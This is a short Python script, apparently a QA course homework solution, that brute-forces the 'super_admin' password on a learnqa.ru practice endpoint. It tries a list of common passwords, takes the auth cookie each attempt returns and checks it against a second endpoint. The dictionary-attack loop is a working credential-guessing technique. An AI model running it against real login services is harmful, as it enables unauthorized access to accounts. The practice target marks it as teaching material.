import requests

possiblePasswords = ['!@#$%^&*', '000000', '1q2w3e4r', '1qaz2wsx', '123qwe', '1234', '12345', '111111', '121212',
                     '123123', '123456', '555555', '654321', '666666', '696969', '888888', '1234567', '7777777',
                     '12345678', '123456789', '1234567890', 'aa123456', 'abc123', 'access', 'admin', 'adobe123',
                     'ashley', 'azerty', 'bailey', 'baseball', 'batman', 'charlie', 'donald', 'dragon', 'flower',
                     'football', 'freedom', 'hello', 'hottie', 'iloveyou', 'jesus', 'letmein', 'login', 'lovely',
                     'loveme', 'master', 'michael', 'monkey', 'mustang', 'ninja', 'passw0rd', 'password', 'password1',
                     'photoshop', 'princess', 'qazwsx', 'qwerty123', 'qwerty', 'qwertyuiop', 'shadow', 'solo',
                     'starwars', 'sunshine', 'superman', 'trustno1', 'welcome', 'whatever', 'zaq1zaq1']

for pwd in possiblePasswords:
    payload = {"login": "super_admin", "password": pwd}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}
    response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
    if response2.text != 'You are NOT authorized':
        print(response2.text)
        print("The password for the login super_admin is %s" % pwd)
